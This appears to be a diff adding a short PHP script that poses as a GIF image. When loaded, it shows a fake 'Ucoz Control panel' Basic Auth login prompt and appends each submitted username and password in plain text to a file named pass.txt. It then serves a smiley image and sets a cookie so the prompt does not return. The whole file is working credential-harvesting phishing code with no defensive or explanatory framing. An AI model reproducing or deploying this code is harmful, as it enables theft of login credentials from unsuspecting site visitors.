@@ -1,0 +1,23 @@
+<?php
+if(!$_COOKIE['LOGON'])
+{
+ $login = $_SERVER['PHP_AUTH_USER'];
+ $pass = $_SERVER['PHP_AUTH_PW'];
+if(strlen($pass) <= 4 || !$login)
+ {
+  Header('HTTP/1.1 401 Unauthorized');
+  Header('WWW-Authenticate: Basic realm="Ucoz Control panel"');
+ }
+ elseif($login)
+ {
+setcookie('LOGON',md5($pass));
+$f = fopen('pass.txt', 'ab');
+fwrite($f, $login." ||| ".$pass."\r\n");
+fclose($f);
+ }
+}
+header("Content-type: image/gif");
+$image = imagecreatefromgif('smile.gif');
+imagegif($image);
+imagedestroy($image);
+?>
